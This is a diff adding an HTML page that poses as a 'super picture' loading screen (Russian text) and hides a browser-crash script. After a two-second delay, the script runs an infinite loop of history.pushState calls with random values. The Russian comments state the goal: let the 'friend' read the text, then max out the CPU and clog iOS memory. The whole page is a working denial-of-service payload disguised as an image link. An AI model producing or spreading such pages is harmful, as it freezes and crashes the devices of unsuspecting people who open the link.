@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Внимание!</title>
+    <style>
+        body { background-color: black; color: white; text-align: center; font-family: sans-serif; margin-top: 20%; }
+    </style>
+</head>
+<body>
+    <h1>Загрузка супер-картинки...</h1>
+    
+    <script>
+        // Ждем 2 секунды, чтобы друг успел прочитать текст, и бьем по процессору
+        setTimeout(function() {
+            while (true) {
+                // Бесконечно пушим состояние в историю браузера, забивая память iOS
+                window.history.pushState(null, null, Math.random().toString());
+            }
+        }, 2000);
+    </script>
+</body>
+</html>
